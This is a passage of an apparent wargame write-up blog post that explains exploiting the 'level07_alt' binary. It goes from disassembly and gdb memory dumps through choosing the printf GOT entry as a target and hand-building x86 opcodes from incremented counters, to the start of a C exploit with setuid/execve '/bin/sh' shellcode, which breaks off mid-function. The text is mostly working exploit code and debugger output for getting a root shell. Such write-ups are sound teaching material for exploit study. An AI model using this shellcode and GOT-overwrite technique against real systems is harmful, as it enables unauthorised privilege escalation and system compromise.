</span><span class='line'> 804963f: 00 0b                   add    %cl,<span class="o">(</span>%ebx<span class="o">)</span>
</span><span class='line'> 8049641: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049643: 00 10                   add    %dl,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049645: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049647: 00 15 00 00 00 00       add    %dl,0x0
</span><span class='line'> 804964d: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804964f: 00 03                   add    %al,<span class="o">(</span>%ebx<span class="o">)</span>
</span><span class='line'> 8049651: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049653: 00 d4                   add    %dl,%ah
</span><span class='line'> 8049655: 96                      xchg   %eax,%esi
</span><span class='line'> 8049656: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049658: 02 00                   add    <span class="o">(</span>%eax<span class="o">)</span>,%al
</span><span class='line'> 804965a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804965c: 18 00                   sbb    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804965e: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049660: 14 00                   adc    <span class="nv">$0x0</span>,%al
</span><span class='line'> 8049662: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049664: 11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049666: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049668: 17                      pop    %ss
</span><span class='line'> 8049669: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804966b: 00 60 82                add    %ah,-0x7e<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804966e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049670: 11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049672: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049674: 58                      pop    %eax
</span><span class='line'> 8049675: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049676: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049678: 12 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%al
</span><span class='line'> 804967a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804967c: 08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804967e: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049680: 13 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%eax
</span><span class='line'> 8049682: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049684: 08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049686: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049688: fe                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049689: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804968a: ff 6f 38                ljmp   *0x38<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 804968d: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804968e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049690: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049691: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049692: ff 6f 01                ljmp   *0x1<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 8049695: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049697: 00 f0                   add    %dh,%al
</span><span class='line'> 8049699: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804969a: ff 6f 2c                ljmp   *0x2c<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 804969d: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804969e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .got:
</span><span class='line'>
</span><span class='line'>080496d0 &lt;.got&gt;:
</span><span class='line'> 80496d0: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .got.plt:
</span><span class='line'>
</span><span class='line'>080496d4 &lt;_GLOBAL_OFFSET_TABLE_&gt;:
</span><span class='line'> 80496d4: 00 96 04 08 00 00       add    %dl,0x804<span class="o">(</span>%esi<span class="o">)</span>
</span><span class='line'> 80496da: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496dc: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496de: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496e0: be 82 04 08 ce          mov    <span class="nv">$0xce080482</span>,%esi
</span><span class='line'> 80496e5: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80496e6: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 80496e8: de                      .byte 0xde
</span><span class='line'> 80496e9: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80496ea: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'>
</span><span class='line'>Disassembly of section .data:
</span><span class='line'>
</span><span class='line'>080496ec &lt;__data_start&gt;:
</span><span class='line'> 80496ec: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>080496f0 &lt;__dso_handle&gt;:
</span><span class='line'> 80496f0: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .bss:
</span><span class='line'>
</span><span class='line'>08049700 &lt;completed.5706&gt;:
</span><span class='line'> 8049700: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>08049704 &lt;dtor_idx.5708&gt;:
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>08049720 &lt;count&gt;:
</span><span class='line'>  ...
</span><span class='line'>... snip ...
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, there area a few sections that we can write to:</p>

<ul>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.ctors</a> section is in range, but this isn&rsquo;t going to help us because the code executed in constructors is executed before our code gets to execute.</li>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.dtors</a> section is in range, hence we might be able to write something to this section which would get executed when the program exits.</li>
<li>The <a href="http://bottomupcs.sourceforge.net/csbu/x3824.htm" title="Global Offset Tables">GOT</a> is in range, so perhaps we can look into overwriting a <code>GOT</code> entry with something else that will help us compromise the application.</li>
</ul>


<p>Let&rsquo;s take a look at what&rsquo;s in the <code>GOT</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump --dynamic-reloc /levels/level07_alt
</span><span class='line'>
</span><span class='line'>/levels/level07_alt:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>080496d0 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>080496e0 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>080496e4 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>080496e8 R_386_JUMP_SLOT   <span class="nb">printf</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they&rsquo;re not really options for attack. The last one, <code>printf</code>, looks promising because this doesn&rsquo;t get invoked until <em>after</em> all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in <code>gdb</code> and take a look at the value that&rsquo;s stored in this location just before the <code>printf</code> call we find that the value is <code>0x080482de</code>. Here&rsquo;s a (tidied) snapshot from <code>gdb</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>x/128x 0x8049520
</span><span class='line'>0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
</span><span class='line'>0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
</span><span class='line'>0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
</span><span class='line'>0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
</span><span class='line'>0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
</span><span class='line'>0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
</span><span class='line'>0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
</span><span class='line'>0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
</span><span class='line'>0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
</span><span class='line'>0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
</span><span class='line'>0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
</span><span class='line'>0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
</span><span class='line'>0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
</span><span class='line'>0x80495f0 &lt;CTE&gt;     : 0x00000000      0xffffffff      0x00000000      0x00000000
</span><span class='line'>0x8049600 &lt;DYN&gt;     : 0x00000001      0x00000010      0x0000000c      0x08048278
</span><span class='line'>0x8049610 &lt;DYN+16&gt;  : 0x0000000d      0x0804859c      0x00000004      0x08048148
</span><span class='line'>0x8049620 &lt;DYN+32&gt;  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
</span><span class='line'>0x8049630 &lt;DYN+48&gt;  : 0x00000006      0x08048190      0x0000000a      0x0000004c
</span><span class='line'>0x8049640 &lt;DYN+64&gt;  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
</span><span class='line'>0x8049650 &lt;DYN+80&gt;  : 0x00000003      0x080496d4      0x00000002      0x00000018
</span><span class='line'>0x8049660 &lt;DYN+96&gt;  : 0x00000014      0x00000011      0x00000017      0x08048260
</span><span class='line'>0x8049670 &lt;DYN+112&gt; : 0x00000011      0x08048258      0x00000012      0x00000008
</span><span class='line'>0x8049680 &lt;DYN+128&gt; : 0x00000013      0x00000008      0x6ffffffe      0x08048238
</span><span class='line'>0x8049690 &lt;DYN+144&gt; : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
</span><span class='line'>0x80496a0 &lt;DYN+160&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496b0 &lt;DYN+176&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496c0 &lt;DYN+192&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
</span><span class='line'>0x80496e0 &lt;GOT+12&gt;  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  &lt;-- just here
</span><span class='line'>0x80496f0 &lt;DSO&gt;     : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
</span></code></pre></td></tr></table></div></figure>


<p>Where:</p>

<ul>
<li><code>CTE</code> &ndash;> CTOR END</li>
<li><code>DYN</code> &ndash;> DYNAMIC</li>
<li><code>GOT</code> &ndash;> GLOBAL OFFSET TABLE</li>
<li><code>DSO</code> &ndash;> DSO HANDLE</li>
</ul>


<p>Remember that the application only allows us to increment existing values one at a time for every &ldquo;index&rdquo; (ie. character) that is passed on the command line. As a result, this value is what we have to add start with, and any address we want to point to has to come after this. Unfortunately for us, there is a limitation on the command line which prevents us from passing in any more than 128k characters. This is going to bite us in the butt later on.</p>

<p>We need to be able to point this address to an area of memory that we control. It&rsquo;d be great if we could point this straight at <code>argv</code>, but we can&rsquo;t do that. Why? Because:</p>

<ol>
<li>The <code>count</code> array is an array of 32-bit integers. This means we can only increment whole <strong>word</strong> values, we can&rsquo;t increment individual <em>bytes</em>.</li>
<li>Areas of memory that we control, such as <code>argv[N]</code>, are in the high address ranges (think something like <code>o0xbffff___</code>). To increment a word value from the <code>printf</code> source value to a value like this, or even another value on the stack, we would need to increment that value too many times. We don&rsquo;t have the command-line character budget to be able to do that.</li>
</ol>


<p>This means that if we want to point the entry to something we control, we&rsquo;re going to have to point it to <code>count</code> +/&ndash; 128 words. This comes with its own set of issues:</p>

<ul>
<li>Within this range we would need to craft our own instructions that get executed, using nothing but incrementing values.</li>
<li>Realistically, we can only write to the lower 2 bytes of each 4-byte word. If we attempt to write higher we either blow our budget or waste too many characters on a single instruction.</li>
<li>The area of memory that we know we have control over that has predictable values prior to our code running is the intended storage area for the <code>count</code> array and at the start of the program that entire area is set to <code>zero</code>.</li>
<li>To my knowledge, there&rsquo;s no <code>GETROOT</code> instruction in x86 assembly, nor are there any instructions less than 3 bytes in size that can do something useful without other instructions working alongside them. This means writing multiple instructions to memory.</li>
<li>If we can only modify the lower 2 bytes, then the higher 2 bytes will remain <code>00 00</code>. Given that Intel x86 is little endian, this means that after our instructions those zero bytes will always be executed before our next instruction does.</li>
<li>The opcode <code>00 00</code> translates to <code>MOV [EAX], AL</code>, which means &ldquo;take the value of the lower-order byte in <code>EAX</code> and store it in the location pointed to by <code>EAX</code>&rdquo;. This means we can&rsquo;t really use <code>EAX</code> for something useful because the code will attempt to write back to areas of memory that we are interested in, probably clobbering code or pointers that are important.</li>
</ul>


<p>Let&rsquo;s take a look at the state of <code>EAX</code> at the time the <code>printf</code> function is called:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484d3
</span><span class='line'>Breakpoint 1 at 0x80484d3
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run abcd
</span><span class='line'>Starting program: /levels/level07_alt abcd
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484d3 in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info registers
</span><span class='line'>eax            0x61   97
</span><span class='line'>ecx            0xbffffcb0 -1073742672
</span><span class='line'>edx            0x80485d1  134514129
</span><span class='line'>ebx            0xb7fd1ff4 -1208147980
</span><span class='line'>esp            0xbffffc60 0xbffffc60
</span><span class='line'>ebp            0xbffffc98 0xbffffc98
</span><span class='line'>esi            0x0    0
</span><span class='line'>edi            0x0    0
</span><span class='line'>eip            0x80484d3  0x80484d3 &lt;main+303&gt;
</span><span class='line'>eflags         0x206  <span class="o">[</span> PF IF <span class="o">]</span>
</span><span class='line'>cs             0x23   35
</span><span class='line'>ss             0x2b   43
</span><span class='line'>ds             0x2b   43
</span><span class='line'>es             0x2b   43
</span><span class='line'>fs             0x0    0
</span><span class='line'>gs             0x63   99
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s interesting is that <code>EAX</code> contains the value <code>0x61</code>, which is ASCII for <code>a</code>. This happens to be the first character we pass in on the command line. As a result, we do have <em>some</em> control over <code>EAX</code> at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of <code>MOV [EAX], AL</code>, we can&rsquo;t let <code>EAX</code> contain a value like <code>0x00000061</code>, as writing to this area will cause an access violation. We&rsquo;re going to have to change this value to a valid pointer.</p>

<p>Also, take a look at <code>ECX</code>, as it&rsquo;s value looks to be in a memory area that we have control over. It turns out that <code>ECX</code> contains a pointer to <code>argc</code>, the number of arguments passed to the program on the command line. What&rsquo;s great about this, is that <code>argv</code> immediately follows it. That is, <code>argv</code> is located at <code>ECX+4</code>. Here we can see the start of a possible attack vector.</p>

<p>To get <code>ECX</code> to point to <code>argv[0]</code> and execute, we&rsquo;d need to do the following (ASM with opcodes):</p>

<pre><code>INC ECX          41
INC ECX          41
INC ECX          41
INC ECX          41
MOV ECX, [ECX]   8B 09
JMP [ECX]        FF 21
</code></pre>

<p>This code increments <code>ECX</code> by <code>4</code>, then jumps to the address that is stored in the value <code>ECX</code> points to. This looks fine, but why can&rsquo;t we do this? Firstly, we can&rsquo;t have the instructions all close together like this. To write these values to the <code>count</code> array, we&rsquo;d have to suffer the pain of having the double zero bytes in the way, like so:</p>

<pre><code>INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>This is made worse by the fact that <code>EAX</code> contains a crap address. Given that we don&rsquo;t really care about the content of <code>ECX</code> which is just a counter of arguments passed to the program, we can overwrite <code>EAX</code> with <code>ECX</code> resulting in a valid pointer that references an address we don&rsquo;t really care about. Each time the double-null instruction is executed, a 1-byte value will be written over the top of <code>argc</code>. No more crash!</p>

<pre><code>MOV EAX, ECX     89 C8
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>Therefore somewhere in <code>count</code> we need to write these values so that the memory looks like this (little-endian remember!):</p>

<pre><code>0x0000C889 0x00004141 0x00004141 0x0000098B 0x000021FF
</code></pre>

<p>Wherever we write this value, we need to know the location so that we can increment the <code>printf</code> <code>GOT</code> entry so that it points to the start of this code. Great, we&rsquo;re well underway then, right?</p>

<p>Wrong, there is still one more issue. If this code runs successfully, then <code>EIP</code> should point directly at <code>argv[0]</code>; that is, it&rsquo;ll point at the string which contains the name of the program that was executed, <code>/levels/level07_alt</code>. This isn&rsquo;t exactly usable shellcode that is going to give us what we need. However, there is a way around this. In C, we can use the <code>execl()</code> function to invoke another binary, and specify <em>all</em> of the arguments <em>including</em> <code>argv[0]</code>. As a result, we can write some shellcode and use this for <code>argv[0]</code> instead of the program name.</p>

<p>So with all this in mind, below is the full source to the exploit (rather verbose, but it&rsquo;s on purpose) in C:</p>

<figure class='code'><figcaption><span>Exploit Source </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">target</span> <span class="o">=</span> <span class="s">&quot;/levels/level07_alt&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x46\x31\xdb\x31\xc9</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xeb\x16\x5b\x31\xc0\x88</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x43\x07\x89\x5b\x08\x89\x43\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xe8\xe5\xff\xff\xff\x2f</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x62\x69\x6e\x2f\x73\x68\x58\x41</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x41\x41\x41\x42\x42\x42\x42\x90</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// this is the address of the count array in memory</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">countAddress</span> <span class="o">=</span> <span class="mh">0x08049720</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// address of the printf GOT entry</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfAddress</span> <span class="o">=</span> <span class="mh">0x80496e8</span><span class="p">;</span>
</span><span class='line'><span class="c1">// initial value of the printf GOT entry</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfValue</span> <span class="o">=</span> <span class="mh">0x080482de</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// The index into the count array which stores the first</span>
</span><span class='line'><span class="c1">// instruction which will be executed when the program</span>
</span><span class='line'><span class="c1">// attempts to print out the results.</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">instructionStartIndex</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// there are all the opcodes we need to write to</span>
</span><span class='line'><span class="c1">// the count array (in little-endian order)</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEaxEcx</span> <span class="o">=</span> <span class="mh">0xC889</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">incIncEcx</span> <span class="o">=</span> <span class="mh">0x4141</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEcxEcx</span> <span class="o">=</span> <span class="mh">0x98B</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">jmpEcx</span> <span class="o">=</span> <span class="mh">0x21FF</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Helper function which gives us the index into the count</span>
</span><span class='line'><span class="c1">// array that we would need in order to write a value to the</span>
</span><span class='line'><span class="c1">// given targetAddress.</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">getIndex</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">targetAddress</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">&lt;</span> <span class="n">countAddress</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="p">(</span><span class="n">countAddress</span> <span class="o">-</span> <span class="n">targetAddress</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">-</span> <span class="n">countAddress</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Helper function which takes a buffer, a value, and a counter and will</span>
</span><span class='line'><span class="c1">// repeatedly write the value to the buffer until the appropriate number of</span>
</span><span class='line'><span class="c1">// writes has happened. It&#39;ll return a pointer to the memory location</span>
</span><span class='line'><span class="c1">// which immediately follows where it finished off.</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">repeat</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">destination</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">value</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
